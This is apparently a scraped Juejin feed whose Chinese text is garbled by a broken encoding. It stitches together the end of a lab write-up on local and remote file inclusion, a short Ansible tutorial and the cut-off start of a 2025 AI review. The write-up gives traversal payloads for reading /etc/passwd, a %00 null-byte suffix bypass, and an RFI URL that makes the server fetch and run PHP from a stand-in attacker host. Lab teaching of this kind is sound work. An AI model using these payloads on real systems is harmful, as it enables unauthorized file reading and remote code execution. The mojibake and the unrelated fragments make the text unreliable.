<p>2ã€ è¾“å…¥/ect/passwd,åˆ©ç”¨includeæ¼æ´è¯»å–æœåŠ¡å™¨çš„æœ¬åœ°æ–‡ä»¶</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb893833e3ae4889a9ca3c37af07a530~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=CunBpNJtVT%2F3YJ%2FkKNZxfa1AVRk%3D" alt="image.png" loading="lazy"/></p>
<p>ã€å®éªŒ2ã€‘</p>
<p>1ã€è¾“å…¥testå®éªŒï¼Œå‘ç°includeè§„å®šè®¿é—®includesæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac39c44b8d38464e8b9f48bdbb5eceac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=ZjFnPMoJC3bZpU3FaWhGa6kZHp0%3D" alt="image.png" loading="lazy"/></p>
<p>2ã€ä½¿ç”¨ç›®å½•ç©¿é€ï¼Œåœ¨urlå‚æ•°ä¸­ä½¿ç”¨ ../../../../etc/passwd,ç©¿é€inludesæ–‡ä»¶åˆ°è¾¾æ ¹ç›®å½•</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da7462b0de3a4e10893da8e38faf3915~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=EdIhOR0Ip1Z6yxUsOpOWlDoo5BE%3D" alt="image.png" loading="lazy"/></p>
<p>ã€å®éªŒ3ã€‘</p>
<p>1ã€è¾“å…¥testï¼Œå‘ç°è°ƒç”¨inclueï¼ˆincluds/test.phpï¼‰
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48468de028d94a83b301d372270032e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=JXjiZ6iEfUhw%2Fz7NAdNJ37BALZ0%3D" alt="image.png" loading="lazy"/></p>
<p>2ã€å¯ä»¥ä½¿ç”¨../../../../etc/passwd%00ï¼Œè¿™æ ·å¯ä»¥å¿½ç•¥ç©ºå­—èŠ‚%00ä»¥åå¾—éƒ¨åˆ†ï¼Œä»è€Œé˜²æ­¢.phpåç¼€çš„æ‹¼æ¥</p>
<p>ã€å®éªŒ4ã€‘</p>
<p>1ã€æˆ‘ä»¬è¾“å…¥etc/passwd,å‘ç°å¼€å‘è€…ä¸å…è®¸è®¿é—®æŒ‡å®šç›®å½•</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d729e3cfd1a43a8b51388fc72284550~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=XYKHsPxCnDsSBusOJmi%2BV5zObNc%3D" alt="image.png" loading="lazy"/></p>
<p>2ã€ä½¿ç”¨etc/passwd/.ï¼ŒåŠ /.æ˜¯ç”¨æ¥è®¿é—®å½“å‰ç›®å½•ï¼Œç”¨æ¥ç»•è¿‡</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71773408e65a4c4183faa9084d311d80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=Ch1LzPbpAsAVb5FYzC1psKTFwjQ%3D" alt="image.png" loading="lazy"/></p>
<p>ã€å®éªŒ6ã€‘</p>
<p>1ã€å‘ç°åªå…è®¸ä»ç‰¹å®šæ–‡ä»¶å¤¹THM-profileæ¥è¿›è¡Œè®¿é—®</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65847c22f6fa49dc83d1ce6f388df73f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=A9im3Xp%2Flx62zseT0eIUAcriK%2BQ%3D" alt="image.png" loading="lazy"/></p>
<p>2ã€ç”¨THM-profileå¼€å¤´ï¼Œé€šè¿‡ç›®å½•ç©¿é€ï¼Œæ¥è·³å‡ºï¼Œè¿›è€Œè®¿é—®/etc/passwd</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d02cf9123ab4611b1f473e2a7090fec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=wUhelQuxYuCk010nKpvKqXIYMV0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">è¿œç¨‹æ–‡ä»¶åŒ…å«</h3>
<p>ã€å®šä¹‰ã€‘</p>
<ul>
<li>ä¸Â LFIÂ ç±»ä¼¼ï¼ŒRFIÂ å‘ç”Ÿåœ¨ç”¨æˆ·è¾“å…¥è¢«ä¸å½“å‡€åŒ–æ—¶ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿå°†å¤–éƒ¨ URL æ³¨å…¥åˆ° includeÂ å‡½æ•°ä¸­ã€‚RFIÂ çš„ä¸€ä¸ªè¦æ±‚æ˜¯Â allow_url_fopenÂ é€‰é¡¹å¿…é¡»å¼€å¯Â ã€‚</li>
<li>RFI çš„é£é™©é«˜äºÂ LFIï¼Œå› ä¸ºÂ RFIÂ æ¼æ´å…è®¸æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šè·å¾—è¿œç¨‹å‘½ä»¤æ‰§è¡Œæƒé™ï¼Œå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œè‡ªå®šä¹‰çš„å‘½ä»¤</li>
</ul>
<p>ã€ä¾‹å­ã€‘</p>
<p>æ”»å‡»è€…åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ‰˜ç®¡ä¸€ä¸ªÂ PHPÂ æ–‡ä»¶Â <code>http://attacker.thm/cmd.txt</code>ï¼Œå…¶ä¸­Â cmd.txtÂ åŒ…å«æ‰“å°æ¶ˆæ¯Â HelloÂ THMã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?</span>PHP <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello THM"</span>; <span class="hljs-meta">?&gt;</span>
</code></pre>
<p>æ”»å‡»è€…æ³¨å…¥æ¶æ„çš„URL <code>http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt</code>è¿™æ ·å°±èƒ½è¯±å¯¼æœåŠ¡å™¨è®¿é—®è‡ªå·±çš„èŠ‚ç‚¹å¹¶æ‰§è¡Œä»£ç </p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2db26b0d4cb2451f8fa45af8acc17109~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=2HwMUbLraDA2%2FsCI5Eh8L7BLAYU%3D" alt="image.png" loading="lazy"/></p>
<p>âœ… å¯ä»¥ç”¨<code>python -m http.server</code>å°†æœ¬æœºå¯åŠ¨ä¸ºæœåŠ¡å™¨ï¼Œå¹¶æ–°å»ºphpæ–‡ä»¶ï¼Œå¹¶è¿›è¡Œå®éªŒï¼Œè¯±å¯¼ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œæœ¬æœºæ–°å»ºçš„php</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»Šå¤©æµ…æµ…çš„å›é¡¾ä¸€ä¸‹Ansibleå§]]></title>    <link>https://juejin.cn/post/7592803747470966834</link>    <guid>https://juejin.cn/post/7592803747470966834</guid>    <pubDate>2026-01-08T09:14:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592803747470966834" data-draft-id="7592710766010220554" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»Šå¤©æµ…æµ…çš„å›é¡¾ä¸€ä¸‹Ansibleå§"/> <meta itemprop="keywords" content="è¿ç»´"/> <meta itemprop="datePublished" content="2026-01-08T09:14:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Sheffield"/> <meta itemprop="url" content="https://juejin.cn/user/362164852109770"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»Šå¤©æµ…æµ…çš„å›é¡¾ä¸€ä¸‹Ansibleå§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/362164852109770/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Sheffield
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:14:35.000Z" title="Thu Jan 08 2026 09:14:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä»€ä¹ˆæ˜¯Ansibleï¼Œä»–æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</h2>
<p>Ansibleæ˜¯ä¸€æ¬¾<strong>æ— ä»£ç†è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·</strong>ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯æ‰¹é‡ç®¡ç†æœåŠ¡å™¨ï¼šæ¯”å¦‚æ‰¹é‡æ‰§è¡Œå‘½ä»¤ã€å®‰è£…è½¯ä»¶ã€é…ç½®æœåŠ¡ã€éƒ¨ç½²ä»£ç ç­‰ã€‚</p>
<p>å®ƒçš„ä¼˜åŠ¿å¾ˆæ˜æ˜¾ï¼š</p>
<ul>
<li>æ— ä»£ç†ï¼šè¢«æ§æœåŠ¡å™¨ä¸ç”¨è£…é¢å¤–è½¯ä»¶ï¼Œé SSHå°±èƒ½é€šä¿¡ï¼ˆå¤§å¤šæ•°æœåŠ¡å™¨é»˜è®¤æ”¯æŒï¼‰ã€‚</li>
<li>ç”¨Pythonå†™çš„ï¼Œè·¨å¹³å°ã€å…¼å®¹æ€§å¥½ã€‚</li>
<li>é…ç½®æ–‡ä»¶æ˜¯YAMLæ ¼å¼ï¼Œç®€å•æ˜“æ‡‚ï¼Œä¸ç”¨å†™å¤æ‚ä»£ç ã€‚</li>
<li>è½»é‡ï¼šå®‰è£…ç®€å•ï¼Œå­¦ä¹ æˆæœ¬ä½ã€‚</li>
</ul>
<h2 data-id="heading-1">æ€ä¹ˆå®‰è£…Ansibleï¼Ÿ</h2>
<p>Centos 7 åœ¨æœ‰epelçš„æƒ…å†µä¸‹ï¼š<code>yum install -y ansible</code>å³å¯ã€‚</p>
<h2 data-id="heading-2">Ansibleçš„ç›®å½•ç»“æ„æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>Ansibleé»˜è®¤é…ç½®æ–‡ä»¶å’Œæ ¸å¿ƒç›®å½•éƒ½åœ¨ <code>/etc/ansible/</code> ä¸‹ï¼Œä¸»è¦æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼š</p>
<ul>
<li><strong>ansible.cfgï¼ˆä¸»é…ç½®æ–‡ä»¶ï¼‰</strong> ï¼šæ§åˆ¶Ansibleçš„è¿è¡Œå‚æ•°ï¼Œæ¯”å¦‚é»˜è®¤SSHç«¯å£ã€è¶…æ—¶æ—¶é—´ã€æ¨¡å—è·¯å¾„ç­‰ã€‚æ–°æ‰‹åˆæœŸä¸ç”¨æ”¹ï¼Œç”¨é»˜è®¤é…ç½®å³å¯ï¼Œåç»­ç†Ÿæ‚‰åå†æ ¹æ®éœ€æ±‚è°ƒæ•´ã€‚</li>
<li><strong>hostsï¼ˆä¸»æœºæ¸…å•ï¼‰</strong> ï¼šæœ€æ ¸å¿ƒçš„æ–‡ä»¶ä¹‹ä¸€ï¼ç”¨æ¥è®°å½•æ‰€æœ‰éœ€è¦ç®¡ç†çš„è¢«æ§æœåŠ¡å™¨ä¿¡æ¯ï¼ˆIPã€ç”¨æˆ·åã€ç«¯å£ç­‰ï¼‰ï¼ŒAnsibleæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå°±æ˜¯é€šè¿‡è¿™ä¸ªæ–‡ä»¶æ‰¾åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚</li>
<li><strong>rolesï¼ˆè§’è‰²ç›®å½•ï¼‰</strong> ï¼šç”¨æ¥å­˜æ”¾Ansibleè§’è‰²ï¼ˆRoleï¼‰ï¼Œæ˜¯è¿›é˜¶åŠŸèƒ½ï¼Œç”¨äºç»„ç»‡å¤æ‚çš„Playbookã€‚</li>
</ul>
<h2 data-id="heading-3">hostçš„ç¼–å†™</h2>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å•å°æœåŠ¡å™¨</span>
lb 192.168.1.100 <span class="hljs-attr">ansible_ssh_user</span>=root ansible_ssh_pass=****

<span class="hljs-comment"># å¤šå°WebæœåŠ¡å™¨åˆ†ç»„</span>
<span class="hljs-section">[web]</span>
web01 192.168.1.100 <span class="hljs-attr">ansible_ssh_user</span>=root ansible_ssh_pass=****
web02 192.168.1.100 <span class="hljs-attr">ansible_ssh_user</span>=root ansible_ssh_pass=****
</code></pre>
<p>ç„¶åä½¿ç”¨<code>ansible lb -m ping</code>/<code>ansible web -m ping</code>æµ‹è¯•ï¼Œå‡ºç° <code>"pong"</code> å°±è¯´æ˜è¿æ¥æˆåŠŸäº†ï¼</p>
<h2 data-id="heading-4">ç¼–å†™è‡ªå·±çš„ç¬¬ä¸€ä¸ªPlaybook</h2>
<p>Ansibleçš„å‰§æœ¬æ˜¯Playbookï¼Œæ ¼å¼æ˜¯ymlï¼Œå¯¹äºç©ºæ ¼æœ‰ä¸¥æ ¼çš„è¦æ±‚ã€‚
ä¸‹é¢æˆ‘å†™ä¸ªå®‰è£…Nginxå’Œå…³é—­SElinuxã€firewalldçš„Playbookï¼Œå¦‚ä¸‹ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Playå—èµ·å§‹ï¼šå®šä¹‰æ•´ä¸ªä»»åŠ¡çš„æ ¸å¿ƒä¿¡æ¯</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">install</span> <span class="hljs-string">Nginx</span>  <span class="hljs-comment"># ä»»åŠ¡åç§°ï¼šæ˜ç¡®è¯¥Playçš„æ ¸å¿ƒä½œç”¨æ˜¯å®‰è£…Nginx</span>
  <span class="hljs-attr">hosts:</span> <span class="hljs-string">lb</span>           <span class="hljs-comment"># ç›®æ ‡ä¸»æœºï¼šæ“ä½œåä¸ºlbçš„æœåŠ¡å™¨</span>
  
  <span class="hljs-attr">tasks:</span>              <span class="hljs-comment"># ä»»åŠ¡åˆ—è¡¨ï¼šåç»­æ‰€æœ‰å…·ä½“æ“ä½œéƒ½æ”¾åœ¨tasksä¸‹</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">install</span> <span class="hljs-string">Nginx</span>  <span class="hljs-comment"># å­ä»»åŠ¡åç§°ï¼šæè¿°å½“å‰æ­¥éª¤ä½œç”¨</span>
      <span class="hljs-attr">yum:</span>                <span class="hljs-comment"># ä½¿ç”¨yumæ¨¡å—</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span>       <span class="hljs-comment"># å®‰è£…çš„è½¯ä»¶åç§°ï¼šnginx</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">present</span>    <span class="hljs-comment"># çŠ¶æ€ï¼špresentè¡¨ç¤ºç¡®ä¿è½¯ä»¶å·²å®‰è£…</span>
    
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">stop</span> <span class="hljs-string">firewalld</span>
      <span class="hljs-attr">service:</span>              <span class="hljs-comment"># ä½¿ç”¨serviceæ¨¡å—ï¼šç®¡ç†ç³»ç»ŸæœåŠ¡</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">firewalld</span>     <span class="hljs-comment"># æ“ä½œçš„æœåŠ¡åç§°ï¼šfirewalld</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">stopped</span>      <span class="hljs-comment"># æœåŠ¡çŠ¶æ€ï¼šstoppedè¡¨ç¤ºåœæ­¢å½“å‰æœåŠ¡</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">no</span>         <span class="hljs-comment"># å¼€æœºè‡ªå¯ï¼šnoè¡¨ç¤ºç¦æ­¢æœåŠ¡å¼€æœºè‡ªåŠ¨å¯åŠ¨</span>
    
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">stop</span> <span class="hljs-string">SELinux</span>    <span class="hljs-comment"># å­ä»»åŠ¡åç§°</span>
      <span class="hljs-attr">command:</span> <span class="hljs-string">setenforce</span> <span class="hljs-number">0</span> <span class="hljs-comment"># ä½¿ç”¨commandæ¨¡å—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span>
</code></pre>
<p>å…ˆå†™è¿™ä¹ˆå¤šï¼Œåé¢æœ‰æ—¶é—´å†å¤šå†™ç‚¹å¹²è´§ğŸ¤­ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 å¹´ AI å¤§äº‹ä»¶çºªè¦]]></title>    <link>https://juejin.cn/post/7592815497847521343</link>    <guid>https://juejin.cn/post/7592815497847521343</guid>    <pubDate>2026-01-08T09:37:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497847521343" data-draft-id="7592789801708879913" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 å¹´ AI å¤§äº‹ä»¶çºªè¦"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T09:37:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="NanBox"/> <meta itemprop="url" content="https://juejin.cn/user/3175045309414935"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 å¹´ AI å¤§äº‹ä»¶çºªè¦
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3175045309414935/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    NanBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:37:23.000Z" title="Thu Jan 08 2026 09:37:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body 